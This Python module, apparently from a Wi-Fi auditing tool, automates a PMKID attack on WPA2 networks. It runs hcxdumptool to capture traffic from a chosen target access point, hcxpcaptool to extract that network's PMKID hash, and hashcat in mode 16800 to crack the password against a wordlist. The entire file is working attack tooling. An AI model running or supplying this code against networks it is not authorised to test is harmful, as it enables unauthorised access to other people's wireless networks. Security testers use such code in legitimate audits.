#!/usr/bin/env python
# -*- coding: utf-8 -*-

from .dependency import Dependency
from ..config import Configuration
from ..util.process import Process
from ..util.color import Color

import os


class Hashcat(Dependency):
    dependency_required = False
    dependency_name = 'hashcat'
    dependency_url = 'https://hashcat.net/hashcat/'

    @staticmethod
    def crack_pmkid(pmkid_file):
        '''
        Cracks a given pmkid_file using the PMKID/WPA2 attack (-m 16800)
        Returns:
            Key (str) if found; `None` if not found.
        '''

        # Run hashcat once normally, then with --show if it failed
        # To catch cases where the password is already in the pot file.
        for additional_arg in ([], ['--show']):
            command = [
                'hashcat',
                '--force',
                '--quiet',      # Only output the password if found.
                '-m', '16800',  # WPA-PMKID-PBKDF2
                '-a', '0',      # TODO: Configure
                '-w', '2',      # TODO: Configure
                pmkid_file,
                Configuration.wordlist
            ]
            command.extend(additional_arg)

            # TODO: Check status of hashcat (%); it's impossible with --quiet

            try:
                hashcat_proc = Process(command)
                hashcat_proc.wait()
                stdout = hashcat_proc.stdout()
            except KeyboardInterrupt:  # In case user gets impatient
                Color.pl('\n{!} {O}Interrupted hashcat cracking{W}')
                stdout = ''

            if ':' not in stdout:
                # Failed
                continue
            else:
                # Cracked
                key = stdout.strip().split(':', 1)[1]
                return key


class HcxDumpTool(Dependency):
    dependency_required = False
    dependency_name = 'hcxdumptool'
    dependency_url = 'https://github.com/ZerBea/hcxdumptool'

    def __init__(self, target, pcapng_file):
        # Create filterlist
        filterlist = Configuration.temp('pmkid.filterlist')
        with open(filterlist, 'w') as filter_handle:
            filter_handle.write(target.bssid.replace(':', ''))

        if os.path.exists(pcapng_file):
            os.remove(pcapng_file)

        command = [
            "hcxdumptool",
            "-i", Configuration.interface,
            "--filterlist", filterlist,
            "--filtermode", "2",
            "-c", str(target.channel),
            "-o", pcapng_file
        ]

        self.proc = Process(command)

    def poll(self):
        return self.proc.poll()

    def interrupt(self):
        self.proc.interrupt()


class HcxPcapTool(Dependency):
    dependency_required = False
    dependency_name = 'hcxpcaptool'
    dependency_url = 'https://github.com/ZerBea/hcxtools'

    def __init__(self, target):
        self.target = target
        self.bssid = self.target.bssid.lower().replace(':', '')
        self.pmkid_file = Configuration.temp('pmkid-%s.16800' % self.bssid)

    def get_pmkid_hash(self, pcapng_file):
        if os.path.exists(self.pmkid_file):
            os.remove(self.pmkid_file)

        command = [
            'hcxpcaptool',
            '-z', self.pmkid_file,
            pcapng_file
        ]
        hcxpcap_proc = Process(command)
        hcxpcap_proc.wait()

        if not os.path.exists(self.pmkid_file):
            return None

        with open(self.pmkid_file, 'r') as f:
            output = f.read()
            # Each line looks like:
            # hash*bssid*station*essid

        # Note: The dumptool will record *anything* it finds, ignoring the filterlist.
        # Check that we got the right target (filter by BSSID)
        matching_pmkid_hash = None
        for line in output.split('\n'):
            fields = line.split('*')
            if len(fields) >= 3 and fields[1].lower() == self.bssid:
                # Found it
                matching_pmkid_hash = line
                break

        os.remove(self.pmkid_file)
        return matching_pmkid_hash
